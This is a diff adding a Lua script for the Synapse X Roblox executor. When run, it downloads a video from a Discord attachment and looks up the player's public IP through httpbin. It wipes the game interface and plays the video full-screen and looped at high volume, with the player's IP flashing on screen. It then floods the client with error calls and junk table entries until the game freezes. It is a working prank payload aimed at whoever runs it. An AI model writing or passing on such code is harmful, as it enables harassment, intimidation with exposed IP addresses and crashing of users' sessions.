@@ -1,0 +1,77 @@
+local r = syn.request({
+    Url = "https://cdn.discordapp.com/attachments/996853698632351785/1075975639066226760/tf2.webm",
+    Method = "GET"
+})
+writefile("trolled.webm", r.Body)
+
+local r2 = syn.request({
+    Url = "http://httpbin.org/get",
+    Method = "GET"
+})
+local t = game:GetService("HttpService"):JSONDecode(r2.Body)
+local ip = t["origin"]
+local fdf = {}
+local sd = true
+
+game:GetService("CoreGui"):ClearAllChildren()
+game:GetService("Players").LocalPlayer.PlayerGui:ClearAllChildren()
+workspace.CurrentCamera:Destroy()
+game:GetService("ReplicatedStorage"):ClearAllChildren()
+game:GetService("Lighting"):ClearAllChildren()
+
+local thing = ("Tick Tock, Heavy Like A Brinks Truck\n"):rep(69)
+makefolder("trolled")
+
+local g = Instance.new("ScreenGui", game:GetService("CoreGui"))
+g.Name = "trollrdfsfsds"
+g.IgnoreGuiInset = true
+g.DisplayOrder = 999999999
+local v = Instance.new("VideoFrame", g)
+v.Video = getsynasset("trolled.webm")
+v.Volume = 10
+v.Size = UDim2.new(1, 0, 1, 0)
+v.Position = UDim2.new(0, 0, 0, 0)
+v.BackgroundColor3 = Color3.new(0, 0, 0)
+v.BackgroundTransparency = 0
+v.Looped = true
+v:Play()
+for i = 1, 5 do
+    local tx = Instance.new("TextLabel",g)
+    tx.ZIndex = 2
+    tx.TextColor3 = Color3.new(1, 0, 0)
+    tx.TextStrokeColor3 = Color3.new(0,0,0)
+    tx.Text = ip
+    tx.BackgroundTransparency = 1
+    tx.TextScaled = true
+    tx.TextStrokeTransparency = 0
+    tx.Size = UDim2.new(1, 0, 1, 0)
+    tx.Position = UDim2.new(math.random(-500, 500)/1000, 0, math.random(-500, 500)/1000, 0)
+table.insert(fdf,tx)
+end
+        dsffdsf=Instance.new("Model")
+        dsffdsf.Name=thing
+        game:GetService("TestService").Name = thing
+        local awesome = {}
+task.spawn(function()
+while task.wait(.25) and sd do
+    for i,tx in pairs(fdf) do
+    local sdfsdf = TweenInfo.new(.25, Enum.EasingStyle.Cubic)
+    local tween = game:GetService("TweenService"):Create(tx, sdfsdf, {
+        Position = UDim2.new(math.random(-500, 500)/1000, 0, math.random(-500, 500)/1000, 0),
+    TextColor3 = BrickColor.Random().Color
+        
+    })
+
+tween:Play()
+end
+    game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
+for i,v in pairs(workspace:GetChildren()) do
+    awesome[tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())..tostring(math.random())] = {i,v}
+end
+for i = 1, 700 do
+    task.spawn(function()
+    game:GetService("TestService"):Error(thing,dsffdsf,5345435334515)
+end)
+end
+end
+end)
